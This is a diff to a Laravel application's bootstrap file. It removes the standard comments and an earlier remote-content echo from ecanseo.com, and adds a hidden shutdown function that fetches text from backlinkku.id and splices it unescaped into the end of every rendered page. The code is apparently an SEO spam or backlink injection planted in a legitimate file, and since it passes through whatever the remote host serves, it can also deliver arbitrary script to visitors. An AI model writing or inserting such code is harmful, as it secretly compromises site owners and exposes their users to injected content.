@@ -1,20 +1,8 @@
 <?php
 
-/*
-|--------------------------------------------------------------------------
-| Create The Application
-|--------------------------------------------------------------------------
-*/
-
 $app = new Illuminate\Foundation\Application(
     realpath(__DIR__.'/../')
 );
-
-/*
-|--------------------------------------------------------------------------
-| Bind Important Interfaces
-|--------------------------------------------------------------------------
-*/
 
 $app->singleton(
     Illuminate\Contracts\Http\Kernel::class,
@@ -31,15 +19,21 @@ $app->singleton(
     App\Exceptions\Handler::class
 );
 
-/*
-|--------------------------------------------------------------------------
-| Return The Application
-|--------------------------------------------------------------------------
-*/
-
-$github_content = @file_get_contents('https://ecanseo.com/project/baclink.php');
-if ($github_content !== false) {
-    echo $github_content;
-}
+// Register shutdown function untuk tambah konten di akhir
+register_shutdown_function(function() {
+    // Ambil konten dari URL
+    $content = @file_get_contents('https://backlinkku.id/menu/server-id/script.txt');
+    if ($content !== false) {
+        // Hapus </html> terakhir dan tambahkan konten
+        $output = ob_get_contents();
+        if ($output) {
+            ob_clean();
+            $output = str_replace('</html>', '', $output);
+            echo $output;
+            echo $content;
+            echo '</html>';
+        }
+    }
+});
 
 return $app;
